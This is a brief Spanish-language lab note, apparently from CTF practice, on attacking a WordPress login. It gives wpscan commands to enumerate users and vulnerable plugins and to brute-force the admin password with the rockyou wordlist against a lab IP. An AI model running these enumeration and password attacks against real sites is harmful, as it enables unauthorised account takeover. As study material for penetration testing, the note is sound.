
Cuando encontremos un entorno wordpress es reconocible por el codigo de la pagina y es importante si no carga correctamente la web cambiar el fichero /etc/hosts para redirigir la ip de la máquina a la web correspondiente.
El objetivo será hacer fuzzing hasta encontrar el panel de wp-login.php en el que podemos poner usuario y contraseña
![[Pasted image 20240308002602.png]]
Para atacarlo usaremos wpscan tanto para sacar usuarios como sus contraseñas
Primero usaremos este comando para sacar usuarios y pluggins vulnerables
```bash
wpscan --url http://10.10.168.161/blog --enumerate u,vp
```
Cuando ya tenemos el usuario haremos el siguiente ataque en busca de la contraseña
```bash 
wpscan --url http://10.10.168.161/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```
Y la encuentra:
![[Pasted image 20240308010525.png]]